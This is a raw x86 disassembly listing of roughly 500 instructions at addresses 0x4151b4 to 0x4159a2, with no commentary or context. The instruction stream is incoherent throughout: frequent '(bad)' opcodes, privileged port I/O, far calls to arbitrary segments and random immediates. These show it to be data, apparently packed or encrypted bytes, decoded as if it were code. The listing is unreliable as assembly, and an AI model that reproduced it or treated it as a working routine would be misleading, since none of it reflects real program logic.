  4151b4:	xor    DWORD PTR [ebx-0xfdbe5d7],ebp
  4151ba:	jne    0x415184
  4151bc:	pinsrw mm6,WORD PTR [ebx],0x12
  4151c0:	xor    DWORD PTR [ebx+0x32c7b69f],edx
  4151c6:	cs (bad) 
  4151c8:	jg     0x41515e
  4151ca:	inc    ebp
  4151cb:	cmp    DWORD PTR [ecx-0x27],ebx
  4151ce:	ins    DWORD PTR es:[edi],dx
  4151cf:	test   BYTE PTR [eax],ah
  4151d1:	ins    BYTE PTR es:[edi],dx
  4151d2:	das    
  4151d3:	add    ecx,DWORD PTR ds:0x589287c3
  4151d9:	mov    cl,0xde
  4151db:	out    dx,al
  4151dc:	rcr    DWORD PTR [eax+0x5],1
  4151df:	mov    ds:0xc099ec92,eax
  4151e4:	mov    al,ds:0x6a7b8e51
  4151e9:	push   ebp
  4151ea:	fidiv  WORD PTR [ebx]
  4151ec:	repz lock mov ds:0x4652c169,eax
  4151f3:	test   al,0xc4
  4151f5:	pop    edx
  4151f6:	out    dx,al
  4151f7:	imul   ecx,DWORD PTR [edi],0xffffffc7
  4151fa:	add    bh,BYTE PTR [ebx]
  4151fc:	sti    
  4151fd:	lahf   
  4151fe:	sbb    DWORD PTR [ebp-0x507f93c0],esi
  415204:	mov    ecx,0xfed512ac
  415209:	mov    BYTE PTR [esi-0x28],ah
  41520c:	in     al,0x9d
  41520e:	mov    al,dh
  415210:	leave  
  415211:	lahf   
  415212:	mov    dh,0x75
  415214:	clc    
  415215:	push   0x76
  415217:	jb     0x4151f1
  415219:	retf   
  41521a:	cmp    eax,0x81c20543
  41521f:	xchg   ebx,eax
  415220:	adc    DWORD PTR ds:0x11f6cbc,esi
  415226:	imul   edx,DWORD PTR [ebp+0x7b],0x8b352856
  41522d:	mov    eax,ds:0xaf1b4f72
  415232:	or     al,0x33
  415234:	jbe    0x4152a4
  415236:	retf   
  415237:	ins    DWORD PTR es:[edi],dx
  415238:	mov    ecx,cs
  41523a:	add    eax,0x1a785a88
  41523f:	into   
  415240:	stos   DWORD PTR es:[edi],eax
  415241:	in     eax,dx
  415242:	cs pop ss
  415244:	jnp    0x415230
  415246:	fcmovnu st,st(3)
  415248:	or     esi,DWORD PTR [esi]
  41524a:	imul   ebp,DWORD PTR [esi-0x366dede6],0x4f
  415251:	lock lea ebp,[ecx-0x2866d35c]
  415258:	inc    edi
  415259:	fist   WORD PTR [ecx-0x6ef6563e]
  41525f:	aaa    
  415260:	push   edi
  415261:	cwde   
  415262:	dec    ebp
  415263:	sbb    esi,esp
  415265:	sub    al,0xb0
  415267:	inc    ecx
  415268:	mov    dh,0xca
  41526a:	imul   esp,DWORD PTR [edi-0x49],0xffffff93
  41526e:	mov    bh,0x91
  415270:	dec    esi
  415271:	mov    eax,0xf075fec1
  415276:	jl     0x41528f
  415278:	sub    ch,al
  41527a:	or     al,0x1e
  41527c:	enter  0xa07b,0x37
  415280:	add    BYTE PTR [esi-0x60ed5b23],al
  415286:	outs   dx,BYTE PTR ds:[esi]
  415287:	das    
  415288:	popa   
  415289:	adc    edi,edi
  41528b:	push   0x51
  41528d:	ror    bh,1
  41528f:	enter  0xc435,0xfe
  415293:	xchg   esi,eax
  415294:	mov    esp,0xed151ed9
  415299:	cmp    eax,0xe943d599
  41529e:	outs   dx,DWORD PTR ds:[esi]
  41529f:	out    0xe5,al
  4152a1:	icebp  
  4152a2:	scas   al,BYTE PTR es:[edi]
  4152a3:	jecxz  0x4152e4
  4152a5:	clc    
  4152a6:	lds    esp,FWORD PTR [eax+esi*4+0x45173c87]
  4152ad:	xchg   ebx,eax
  4152ae:	pusha  
  4152af:	or     BYTE PTR [esi],0x9a
  4152b2:	in     eax,dx
  4152b3:	jp     0x415298
  4152b5:	mov    ecx,0x67311310
  4152ba:	and    cl,BYTE PTR [edi]
  4152bc:	adc    ebx,DWORD PTR [ebp+ebx*1+0x1812234e]
  4152c3:	dec    esi
  4152c4:	mov    DWORD PTR [ecx-0x49795cc3],ecx
  4152ca:	mov    bh,0x73
  4152cc:	push   ebx
  4152cd:	mov    edi,0xff82dc39
  4152d2:	(bad)  
  4152d3:	pop    edx
  4152d4:	mov    eax,0xebf49543
  4152d9:	add    eax,0x8c36e3d0
  4152de:	fiadd  WORD PTR [esi-0x4b04dc7b]
  4152e4:	gs mov ah,0x21
  4152e7:	aam    0x7f
  4152e9:	and    BYTE PTR [ebp-0x129dce35],bl
  4152ef:	mov    dh,0x95
  4152f1:	out    0x24,eax
  4152f3:	gs (bad) 
  4152f5:	pop    ebx
  4152f6:	hlt    
  4152f7:	adc    al,0x1a
  4152f9:	xchg   esi,eax
  4152fa:	inc    edi
  4152fb:	sbb    dh,0xe6
  4152fe:	xchg   ecx,eax
  4152ff:	inc    BYTE PTR [edx+ebp*2-0x7fad1ecc]
  415306:	rol    DWORD PTR [edx-0x429def9f],cl
  41530c:	or     eax,DWORD PTR [edi+0x35]
  41530f:	imul   ecx,DWORD PTR [esi+edi*8],0xffffff8b
  415313:	sbb    BYTE PTR [ebx-0x321b12b8],0x9
  41531a:	(bad)  
  41531b:	or     eax,0x93d81fc2
  415320:	xor    bl,dl
  415322:	mov    ebp,0x2b0e4c6f
  415327:	jb     0x415388
  415329:	inc    ebx
  41532a:	xchg   edx,eax
  41532b:	rcl    edi,cl
  41532d:	mov    dh,0xc2
  41532f:	sar    BYTE PTR [ebx+0x1da1caa],0x47
  415336:	arpl   WORD PTR [eax],bx
  415338:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41533a:	and    eax,DWORD PTR [eax]
  41533c:	in     eax,dx
  41533d:	xchg   edi,eax
  41533e:	jmp    0x415354
  415340:	adc    dl,BYTE PTR [ecx-0x50]
  415343:	scas   al,BYTE PTR es:[edi]
  415344:	jecxz  0x415337
  415346:	hlt    
  415347:	idiv   ebx
  415349:	rcl    BYTE PTR ss:[esi+0x3f7ea99b],cl
  415350:	cmp    bl,BYTE PTR [esi-0x1fe5bb07]
  415356:	dec    ah
  415358:	push   cs
  415359:	pop    ecx
  41535a:	fcomp  QWORD PTR [ecx+ebp*4]
  41535d:	cwde   
  41535e:	popa   
  41535f:	fbstp  TBYTE PTR [eax-0x9289114]
  415365:	in     al,dx
  415366:	xor    DWORD PTR [esi+0x39],0xffffffd2
  41536a:	aad    0xf1
  41536c:	in     al,0xd9
  41536e:	pop    ebx
  41536f:	ss push ebx
  415371:	in     al,dx
  415372:	mov    ecx,0x9d107f23
  415377:	in     al,0x2b
  415379:	sub    esi,eax
  41537b:	cmp    al,0x31
  41537d:	jmp    0x4153b5
  41537f:	ss push ss
  415381:	std    
  415382:	sbb    ecx,edx
  415384:	adc    cl,BYTE PTR [ebx]
  415386:	int3   
  415387:	ins    DWORD PTR es:[edi],dx
  415388:	(bad)  
  415389:	in     al,0x8c
  41538b:	sbb    edx,DWORD PTR [ebx]
  41538d:	add    al,0x6c
  41538f:	inc    esp
  415390:	cmp    al,0x73
  415392:	pop    eax
  415393:	pop    es
  415394:	jae    0x4153b7
  415396:	pop    esp
  415397:	jae    0x415325
  415399:	add    eax,0x971ab372
  41539e:	dec    edi
  41539f:	sub    BYTE PTR [edx+0x7b9d4e14],al
  4153a5:	in     al,dx
  4153a6:	add    eax,0x3604c231
  4153ab:	push   0xd8376fb2
  4153b0:	xor    BYTE PTR [ecx-0x4fafe2f6],bl
  4153b6:	gs mov bl,0x2b
  4153b9:	sbb    bh,ch
  4153bb:	ins    DWORD PTR es:[edi],dx
  4153bc:	inc    ecx
  4153bd:	outs   dx,BYTE PTR ds:[esi]
  4153be:	push   0x56
  4153c0:	stc    
  4153c1:	sub    cl,ah
  4153c3:	mov    ds:0x21c3c2c1,al
  4153c8:	imul   esp,eax,0x35dc3b26
  4153ce:	adc    dh,BYTE PTR [ecx-0x4c]
  4153d1:	jne    0x4153e8
  4153d3:	push   esi
  4153d4:	scas   eax,DWORD PTR es:[edi]
  4153d5:	push   edx
  4153d6:	(bad)  
  4153d7:	dec    esp
  4153d8:	mov    bl,0x80
  4153da:	js     0x4153ca
  4153dc:	mov    cl,0xf2
  4153de:	or     DWORD PTR [esi+0x65317632],edi
  4153e4:	inc    edx
  4153e5:	adc    al,cl
  4153e7:	sbb    edi,DWORD PTR [ecx+0x61]
  4153ea:	and    ebx,edx
  4153ec:	lfs    eax,FWORD PTR [ecx]
  4153ef:	popa   
  4153f0:	pop    esp
  4153f1:	sbb    al,0x4f
  4153f3:	lods   eax,DWORD PTR ds:[esi]
  4153f4:	mov    ah,al
  4153f6:	push   ebx
  4153f7:	lar    edi,WORD PTR [eax]
  4153fa:	or     BYTE PTR [eax+0x221dc2a1],0x27
  415401:	aam    0x40
  415403:	enter  0xb100,0xee
  415407:	inc    edx
  415408:	mov    bl,0xdb
  41540a:	ror    dh,cl
  41540c:	push   es
  41540d:	(bad)  
  41540e:	jmp    0x41a84393
  415413:	(bad)  
  415414:	xchg   ecx,eax
  415415:	add    dh,bh
  415417:	shr    BYTE PTR [edi],cl
  415419:	dec    ebp
  41541a:	ins    DWORD PTR es:[edi],dx
  41541b:	ds push es
  41541d:	pop    DWORD PTR [ecx-0x4c8c0b4a]
  415423:	fadd   QWORD PTR [ecx+ebx*4]
  415426:	stos   BYTE PTR es:[edi],al
  415427:	or     BYTE PTR [edi-0x48],dh
  41542a:	jle    0x4153cf
  41542c:	loopne 0x415429
  41542e:	imul   DWORD PTR [ebx+0x49]
  415431:	repz mov al,BYTE PTR [edi+0x10]
  415435:	xchg   ebp,eax
  415436:	lods   eax,DWORD PTR ds:[esi]
  415437:	stos   BYTE PTR es:[edi],al
  415438:	(bad)  
  415439:	or     dh,BYTE PTR [ebx+0x39d4831]
  41543f:	add    ch,BYTE PTR [ecx+0x34]
  415442:	xchg   dx,ax
  415444:	stos   DWORD PTR es:[edi],eax
  415445:	sub    BYTE PTR [ebx],dl
  415447:	rcl    dh,1
  415449:	mov    ?,edi
  41544b:	mov    esp,0x40c247be
  415450:	lahf   
  415451:	(bad)  
  415452:	sti    
  415453:	inc    edx
  415454:	popa   
  415455:	xor    eax,0xa2959040
  41545a:	pushf  
  41545b:	sbb    DWORD PTR [esi-0xe],ebx
  41545e:	lods   eax,DWORD PTR ds:[esi]
  415460:	dec    edi
  415461:	add    bh,al
  415463:	jg     0x415428
  415465:	cmp    eax,0x3fc6edff
  41546a:	sub    bh,BYTE PTR [esi-0x1e]
  41546d:	xor    eax,0x4a81ed38
  415472:	cs out dx,al
  415474:	or     edx,DWORD PTR [edi+0x2ccf9a8c]
  41547a:	jle    0x415458
  41547c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41547d:	xor    BYTE PTR [ecx],dl
  41547f:	jbe    0x4154f3
  415481:	mov    ebx,DWORD PTR [ebp+0x2a6a20c2]
  415487:	adc    DWORD PTR [edi],edi
  415489:	mov    dh,0xe8
  41548b:	lds    edx,FWORD PTR [edx+0x9]
  41548e:	cmp    DWORD PTR [esi],eax
  415490:	sbb    ebp,DWORD PTR [ebx-0x2615a123]
  415496:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415497:	fnsave ds:0xc69c3f93
  41549d:	mov    ecx,0x26d25e9b
  4154a2:	xchg   esp,eax
  4154a3:	or     esp,DWORD PTR [ebp-0x7a]
  4154a6:	jecxz  0x4154d0
  4154a8:	icebp  
  4154a9:	out    0x6a,al
  4154ab:	inc    ebp
  4154ac:	(bad)  
  4154ad:	xlat   BYTE PTR ds:[ebx]
  4154ae:	push   esp
  4154af:	(bad)  
  4154b1:	in     eax,0xb7
  4154b3:	loopne 0x4154b1
  4154b5:	mov    ebx,0xc283c8db
  4154ba:	int    0x8b
  4154bc:	out    dx,eax
  4154bd:	mov    cl,0x2f
  4154bf:	jbe    0x415521
  4154c1:	(bad)  
  4154c2:	in     al,dx
  4154c3:	ror    edi,1
  4154c5:	xchg   edi,eax
  4154c6:	dec    ebp
  4154c7:	sub    ah,BYTE PTR [esi+edi*2+0x4e089bdd]
  4154ce:	ror    DWORD PTR [eax],cl
  4154d0:	hlt    
  4154d1:	sbb    cl,dl
  4154d3:	inc    ebx
  4154d4:	jge    0x4154fa
  4154d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4154d7:	inc    edi
  4154d8:	jg     0x41547a
  4154da:	ja     0x415521
  4154dc:	or     dh,ch
  4154de:	test   eax,0x98c42a54
  4154e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4154e4:	fstp   st(5)
  4154e6:	jbe    0x4154b4
  4154e8:	push   cs
  4154e9:	pushf  
  4154ea:	out    dx,eax
  4154eb:	sbb    al,0x2a
  4154ed:	call   0xd916714a
  4154f2:	mov    ebx,0x4d0c7eb6
  4154f7:	push   ebx
  4154f8:	das    
  4154f9:	xor    bl,0xf6
  4154fc:	scas   eax,DWORD PTR es:[edi]
  4154fd:	mov    ch,0xe3
  4154ff:	pop    edi
  415500:	or     DWORD PTR [ebx+ecx*4-0x17d7bf73],edi
  415507:	sbb    cl,BYTE PTR ds:0x79498208
  41550d:	dec    ecx
  41550e:	fs xor eax,0x5a5c0158
  415514:	jg     0x415588
  415516:	sub    eax,0x9f44c0c4
  41551b:	xchg   edi,eax
  41551c:	cmp    DWORD PTR [ebx+0x1d8742b9],ecx
  415522:	push   edi
  415523:	adc    cl,BYTE PTR [ecx+0x64]
  415526:	push   eax
  415527:	std    
  415528:	out    dx,al
  415529:	test   DWORD PTR [edi-0x31],edx
  41552c:	jecxz  0x4154f1
  41552e:	inc    ecx
  41552f:	adc    eax,0x9a071d06
  415534:	adc    eax,0xef00607d
  415539:	shr    BYTE PTR ds:0x426f0504,1
  41553f:	loopne 0x415586
  415541:	pop    ebp
  415542:	int3   
  415543:	cmp    DWORD PTR [ebp+0x4189e829],esp
  415549:	cmp    BYTE PTR [ecx+0x62],cl
  41554c:	sbb    DWORD PTR [eax-0x68],edi
  41554f:	leave  
  415550:	adc    eax,DWORD PTR [ebx+0x39]
  415553:	das    
  415554:	into   
  415555:	xor    eax,0x8a08a16e
  41555a:	mov    ecx,eax
  41555c:	jno    0x4155bf
  41555e:	dec    eax
  41555f:	lock push esi
  415561:	fcomp  QWORD PTR [esi-0x1bf8947b]
  415567:	sbb    eax,0xd13eeb7c
  41556c:	pop    ss
  41556d:	into   
  41556e:	int    0x17
  415570:	test   DWORD PTR [ebx-0x1e7b8bfd],esp
  415576:	int3   
  415577:	sub    DWORD PTR ds:0xb8287c44,ebp
  41557d:	or     al,0x29
  41557f:	fs mov eax,0xf37f1f93
  415585:	jno    0x4155b2
  415587:	fwait
  415588:	ret    0x9beb
  41558b:	xchg   edx,eax
  41558c:	adc    eax,0x4978f9bb
  415591:	in     eax,0x20
  415593:	xor    eax,0xa2e2653f
  415598:	adc    DWORD PTR [edx],ecx
  41559a:	call   0x5e6e:0xeec0cb0d
  4155a1:	pop    edx
  4155a2:	sbb    eax,0xb4904147
  4155a7:	ins    DWORD PTR es:[edi],dx
  4155a8:	jmp    esi
  4155aa:	jne    0x41553e
  4155ac:	icebp  
  4155ad:	adc    al,0x8e
  4155af:	stc    
  4155b0:	xor    bl,BYTE PTR [esi-0x21a29db9]
  4155b6:	pop    ss
  4155b7:	ins    DWORD PTR es:[edi],dx
  4155b8:	push   es
  4155b9:	and    eax,0x250d05b9
  4155be:	sbb    esp,DWORD PTR [eax+0x7ccd2111]
  4155c4:	es stos DWORD PTR es:[edi],eax
  4155c6:	mov    ds:0x848a5c7a,al
  4155cb:	cdq    
  4155cc:	mov    esi,0xd9c2d779
  4155d1:	cmp    al,0x28
  4155d3:	addr16 add edx,eax
  4155d6:	and    eax,0x78b6ad96
  4155db:	add    bh,BYTE PTR [edi-0x26]
  4155de:	lds    ebp,FWORD PTR [ebx+0x4db80500]
  4155e4:	ss xor al,0xca
  4155e7:	mov    eax,0xa4c1455b
  4155ec:	xor    eax,0xf78cefb4
  4155f1:	jno    0x4155e3
  4155f3:	ror    DWORD PTR [ecx+0x2d],1
  4155f6:	fdiv   DWORD PTR ss:[ecx+0x1feec002]
  4155fd:	inc    esp
  4155fe:	add    esp,edi
  415600:	shr    BYTE PTR [eax+0x26e760b6],1
  415606:	data16 sbb al,0x89
  415609:	xor    BYTE PTR [esi+esi*1-0x1],bl
  41560d:	adc    al,0xc0
  41560f:	rcl    BYTE PTR [edi],0xdf
  415612:	loope  0x41565c
  415614:	iret   
  415615:	leave  
  415616:	test   eax,0x17290c0
  41561b:	sub    DWORD PTR [eax-0x50],ebp
  41561e:	sub    DWORD PTR [ebx+0x6ea335f0],eax
  415624:	push   es
  415625:	imul   edi,ebp,0x1ff0046e
  41562b:	addr16 mov edx,0xd5323c3c
  415631:	pop    esp
  415632:	jmp    0xa343a4a1
  415637:	fmul   DWORD PTR [ecx+0x7a]
  41563a:	lds    edi,FWORD PTR [edx+0x7f]
  41563d:	jl     0x415602
  41563f:	fadd   QWORD PTR [edx+edi*2-0x79]
  415643:	jns    0x4156ac
  415645:	mov    esi,0x94d1f68c
  41564a:	aam    0x8b
  41564c:	pop    sp
  41564e:	ins    DWORD PTR es:[edi],dx
  41564f:	push   ds
  415650:	mov    ebx,esp
  415652:	inc    edx
  415653:	sbb    DWORD PTR [edi+0x751adc50],edx
  415659:	push   es
  41565a:	test   eax,0x9957c227
  41565f:	push   eax
  415660:	(bad)  
  415661:	adc    dh,ah
  415663:	fadd   st,st(6)
  415665:	xor    BYTE PTR [ebx+eiz*2+0x4c],al
  415669:	mov    ds:0xd88427b1,eax
  41566e:	repnz mov ch,0x8b
  415671:	ret    0x3ad9
  415674:	jmp    0xaf231197
  415679:	ror    DWORD PTR [esi+0xfd72d77],1
  41567f:	call   0x1d77728b
  415684:	leave  
  415685:	push   cs
  415686:	mov    al,ds:0xcb2bfe46
  41568b:	jge    0x4156d8
  41568d:	pop    edx
  41568e:	aam    0x20
  415690:	pop    ebx
  415691:	mov    eax,DWORD PTR [esi]
  415693:	dec    ebp
  415694:	out    0xe0,al
  415696:	fwait
  415697:	dec    eax
  415699:	inc    edx
  41569a:	sbb    al,0xe5
  41569c:	mov    ah,ah
  41569e:	xchg   esi,eax
  41569f:	fcmovne st,st(3)
  4156a1:	loope  0x415683
  4156a3:	mul    DWORD PTR [ecx-0x3eacea9d]
  4156a9:	aad    0xbb
  4156ab:	dec    esi
  4156ac:	mov    eax,0x91fc364a
  4156b1:	push   ecx
  4156b2:	std    
  4156b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4156b4:	(bad)  
  4156b5:	in     al,dx
  4156b6:	imul   esp,DWORD PTR [ebp-0x1b],0xb05d31ad
  4156bd:	int3   
  4156be:	jbe    0x4156b4
  4156c0:	je     0x415657
  4156c2:	push   es
  4156c3:	pusha  
  4156c4:	(bad)  
  4156c5:	jmp    0xb9a4:0xc158f098
  4156cc:	retf   
  4156cd:	and    eax,0x8b5b8d9d
  4156d2:	test   al,0xa8
  4156d4:	rol    BYTE PTR [ebx-0xeb99a25],0xb
  4156db:	jg     0x415757
  4156dd:	sbb    ah,dl
  4156df:	pop    edi
  4156e0:	retf   0x9b4c
  4156e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4156e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4156e5:	(bad)  
  4156e6:	or     eax,0xd8d1f58
  4156eb:	cmp    al,cl
  4156ed:	icebp  
  4156ee:	add    eax,0xaa74f78b
  4156f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4156f4:	repz mov al,ds:0xd89428e8
  4156fa:	(bad)  
  4156fb:	cwde   
  4156fc:	stc    
  4156fd:	or     bl,bh
  4156ff:	and    ebp,DWORD PTR [ebp+0x40789bb2]
  415705:	jns    0x4156fa
  415707:	pusha  
  415708:	sbb    dh,ah
  41570a:	push   eax
  41570b:	push   0x499ff39d
  415710:	inc    eax
  415711:	std    
  415712:	and    DWORD PTR [esi+0x77],edx
  415715:	fwait
  415716:	ins    BYTE PTR es:[edi],dx
  415717:	xchg   ebp,eax
  415718:	xlat   BYTE PTR ds:[ebx]
  415719:	sub    DWORD PTR [ebx+0x59],ebp
  41571c:	jg     0x415798
  41571e:	(bad)  
  41571f:	xor    ah,BYTE PTR ds:0x8fb428e7
  415725:	pop    ecx
  415726:	jb     0x4156f8
  415728:	jb     0x41571e
  41572a:	push   cs
  41572b:	test   DWORD PTR [esi-0xd],esi
  41572e:	ja     0x415747
  415730:	in     eax,dx
  415731:	push   edx
  415732:	or     al,0xba
  415734:	pop    ebp
  415735:	or     BYTE PTR [esi+0x6f41d653],0x1b
  41573c:	rcr    eax,1
  41573e:	test   al,0x80
  415740:	mov    dh,0x2b
  415742:	push   ebp
  415743:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415744:	lds    ebx,FWORD PTR [ecx]
  415746:	nop
  415747:	or     DWORD PTR [ebx+0x50],ecx
  41574a:	mov    ?,WORD PTR [ebx-0x42c0c261]
  415750:	mov    al,0xfc
  415752:	adc    BYTE PTR [eax-0x48],cl
  415755:	(bad)  [edi+0x6b]
  415758:	mul    BYTE PTR [esp+eax*4-0x5e]
  41575c:	pop    esp
  41575d:	rcl    DWORD PTR [eax-0x4a7d3300],cl
  415763:	dec    esi
  415764:	das    
  415765:	ds add al,0xbd
  415768:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415769:	rcr    BYTE PTR [edi+0x355aa499],cl
  41576f:	jg     0x415727
  415771:	ins    DWORD PTR es:[edi],dx
  415772:	push   ecx
  415773:	adc    ebx,ecx
  415775:	mov    al,0xd
  415777:	pop    edi
  415778:	lahf   
  415779:	and    DWORD PTR [ecx],ebp
  41577b:	daa    
  41577c:	xchg   ecx,eax
  41577d:	fimul  WORD PTR [ebx]
  41577f:	jmp    0xac71:0xeb6af49a
  415786:	fistp  WORD PTR [ebp+ebp*1-0x61]
  41578a:	(bad)  
  41578c:	cmp    DWORD PTR [esi+edi*1+0x371faaea],0x991ec02b
  415797:	sbb    esp,DWORD PTR [edi+0x30161ac1]
  41579d:	mov    dl,0xb
  41579f:	jae    0x415811
  4157a1:	rcr    BYTE PTR [esp+ecx*1-0x70],cl
  4157a5:	cld    
  4157a6:	lods   al,BYTE PTR ds:[esi]
  4157a7:	mov    edx,0x7c7bd54
  4157ac:	fadd   DWORD PTR [ecx]
  4157ae:	rcl    DWORD PTR [ecx+edi*2-0x1893c186],0x96
  4157b6:	xor    eax,0xff1649f7
  4157bb:	jg     0x41578a
  4157bd:	das    
  4157be:	(bad)  
  4157bf:	test   eax,0x30a24fdc
  4157c4:	mov    bl,al
  4157c6:	(bad)  
  4157c7:	scas   eax,DWORD PTR es:[edi]
  4157c8:	adc    dh,dh
  4157ca:	lods   eax,DWORD PTR ds:[esi]
  4157cb:	xlat   BYTE PTR ds:[ebx]
  4157cc:	jb     0x415786
  4157ce:	retf   0xe85a
  4157d1:	mov    eax,0x783f5ccd
  4157d6:	shl    esp,cl
  4157d8:	fisttp WORD PTR [eax-0x4561ed06]
  4157de:	jge    0x4157b7
  4157e0:	xor    al,0x1c
  4157e2:	or     esp,DWORD PTR [esi+0x3f]
  4157e5:	inc    edi
  4157e6:	mov    edi,esp
  4157e8:	adc    DWORD PTR [edx],esp
  4157ea:	enter  0xa003,0xd6
  4157ee:	cwde   
  4157ef:	push   ebp
  4157f0:	inc    eax
  4157f1:	lods   eax,DWORD PTR ds:[esi]
  4157f2:	xor    al,0x75
  4157f4:	out    0x6f,eax
  4157f6:	fld    DWORD PTR [ecx*1+0x4c23600d]
  4157fd:	push   ds
  4157fe:	test   DWORD PTR [ebp+0x5cf9fbd5],esi
  415804:	int3   
  415805:	sub    ecx,DWORD PTR [ebx+0x4e]
  415808:	xchg   ebx,eax
  415809:	inc    sp
  41580b:	sti    
  41580c:	(bad)  
  41580d:	je     0x4157f6
  41580f:	rcl    BYTE PTR [ecx-0x1b],cl
  415812:	(bad)  
  415813:	sub    al,0xf5
  415815:	and    BYTE PTR [ebp-0x16937278],dl
  41581b:	pop    es
  41581c:	jne    0x415882
  41581e:	and    eax,DWORD PTR [esi]
  415820:	adc    BYTE PTR [ecx-0x34],cl
  415823:	inc    ebx
  415824:	pop    ebx
  415825:	xchg   esi,eax
  415826:	add    dh,BYTE PTR [edx]
  415828:	mov    al,0xc9
  41582a:	repnz mov BYTE PTR [edx-0x1dc2fafd],cl
  415831:	adc    al,0x8
  415833:	mov    ah,0xe1
  415835:	xchg   DWORD PTR [edi+0x227deb5e],ecx
  41583b:	push   cs
  41583c:	mov    al,0x96
  41583e:	sti    
  41583f:	jb     0x415855
  415841:	call   0x575c:0x527f7455
  415848:	ss lahf 
  41584a:	sbb    eax,DWORD PTR [eax]
  41584c:	mov    ecx,ebx
  41584e:	icebp  
  41584f:	mov    bh,BYTE PTR [ecx]
  415851:	scas   eax,DWORD PTR es:[edi]
  415852:	adc    cl,bl
  415854:	cli    
  415855:	fs mov bl,0x67
  415858:	xchg   edx,eax
  415859:	pop    esi
  41585a:	into   
  41585b:	inc    BYTE PTR [eax]
  41585d:	jge    0x415893
  41585f:	or     edx,edi
  415861:	iret   
  415862:	sbb    ch,dl
  415864:	retf   0xed69
  415867:	add    al,0x16
  415869:	dec    esi
  41586a:	ins    BYTE PTR es:[edi],dx
  41586b:	sahf   
  41586c:	mov    ebp,0x71bb35
  415871:	jge    0x415847
  415873:	repnz dec ebx
  415875:	jne    0x415880
  415877:	jns    0x4158ab
  415879:	mov    ebp,0xbbd52cba
  41587e:	mov    edi,0x7a9e5e61
  415883:	sub    eax,0x52186e03
  415888:	call   0x60b1:0xf1bcf52d
  41588f:	dec    ebp
  415890:	adc    eax,0x737e089c
  415895:	repnz mov edx,0x869b0ac5
  41589b:	int3   
  41589c:	xchg   ebx,eax
  41589d:	outs   dx,BYTE PTR ds:[esi]
  41589e:	fnstenv [edi+0x24]
  4158a1:	out    dx,eax
  4158a2:	iret   
  4158a3:	jmp    FWORD PTR [edi+ebp*2+0x6b]
  4158a7:	mov    esi,0xac815321
  4158ac:	sub    esi,DWORD PTR [eax]
  4158ae:	inc    ecx
  4158af:	fs inc ebp
  4158b1:	repz fdiv st(0),st
  4158b4:	push   ebx
  4158b5:	std    
  4158b6:	dec    edi
  4158b7:	and    ch,BYTE PTR [edi-0x46]
  4158ba:	sub    ebx,esi
  4158bc:	pushf  
  4158bd:	push   0x91495414
  4158c2:	jnp    0x415856
  4158c4:	dec    esp
  4158c5:	test   eax,0xabdbe8f3
  4158ca:	sti    
  4158cb:	xor    DWORD PTR [eax+0x5b],edx
  4158ce:	pushf  
  4158cf:	test   al,0x16
  4158d1:	inc    eax
  4158d2:	(bad)  
  4158d3:	data16 jecxz 0x415936
  4158d6:	pop    ebp
  4158d7:	ret    0xb24b
  4158da:	mov    ds:0xf4c2bf3a,eax
  4158df:	scas   al,BYTE PTR es:[edi]
  4158e0:	imul   DWORD PTR [ecx+0x10af44e0]
  4158e6:	cmp    ch,BYTE PTR [eax+eiz*4]
  4158e9:	xlat   BYTE PTR ds:[ebx]
  4158ea:	addr16 cli 
  4158ec:	sahf   
  4158ed:	cs int3 
  4158ef:	stos   DWORD PTR es:[edi],eax
  4158f0:	inc    ebp
  4158f1:	inc    ecx
  4158f2:	out    dx,eax
  4158f3:	ret    0x823b
  4158f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4158f7:	cmp    ch,al
  4158f9:	and    eax,0x2466fee5
  4158fe:	cmp    dl,al
  415900:	pop    es
  415901:	mov    ebx,0x1207d663
  415906:	dec    si
  415908:	mov    bh,0xbd
  41590a:	mov    edi,0xa2c5035f
  41590f:	jl     0x41598e
  415911:	test   DWORD PTR [eax],ebp
  415913:	fild   WORD PTR cs:[ecx+0x14]
  415917:	mov    BYTE PTR [ebx+0x11f6f27d],bh
  41591d:	sub    ch,BYTE PTR [edi-0xe]
  415920:	(bad)  
  415921:	mov    bh,0xde
  415923:	gs xchg ch,al
  415926:	lahf   
  415927:	shl    DWORD PTR [ebx-0x2b],cl
  41592a:	mov    esi,0xa7fb3a43
  41592f:	in     eax,dx
  415930:	call   0x7216:0x27a609ba
  415937:	xchg   edi,eax
  415938:	lock fldcw WORD PTR [ebp-0x18e80e91]
  41593f:	mov    esi,0xc6f69a5e
  415944:	inc    edx
  415945:	sbb    dh,ch
  415947:	sbb    al,0x69
  415949:	out    dx,eax
  41594a:	call   0x99f8:0xd0ffda2d
  415951:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415952:	push   ebp
  415953:	jge    0x4159b9
  415955:	jmp    FWORD PTR [edx-0x38]
  415958:	xor    BYTE PTR [edx+0x74067bfe],0x87
  41595f:	cld    
  415960:	rol    DWORD PTR [edi+0x766511c4],cl
  415966:	pop    ecx
  415967:	or     DWORD PTR [ecx-0x5d],esi
  41596a:	fimul  DWORD PTR [ebp-0x21]
  41596d:	ret    
  41596e:	inc    ecx
  41596f:	mov    esi,0xbf842f2b
  415974:	das    
  415975:	add    bh,BYTE PTR [edi-0x50]
  415978:	and    eax,0xa78a7b58
  41597d:	jecxz  0x4159db
  41597f:	mov    ch,0x31
  415981:	or     DWORD PTR [esi+0x7a],0x4d33055c
  415988:	jg     0x4159a5
  41598a:	xchg   ecx,eax
  41598b:	ret    
  41598c:	cmp    bl,BYTE PTR [eax]
  41598e:	mov    edi,0x2794f65
  415993:	outs   dx,DWORD PTR ds:[esi]
  415994:	mov    ch,0x3e
  415996:	jge    0x4159e8
  415998:	test   BYTE PTR [ebx+0x1a],dl
  41599b:	fsubrp st(2),st
  41599d:	push   cs
  41599e:	fst    DWORD PTR [edx]
  4159a0:	xchg   esp,eax
  4159a1:	pop    ebx
  4159a2:	nop
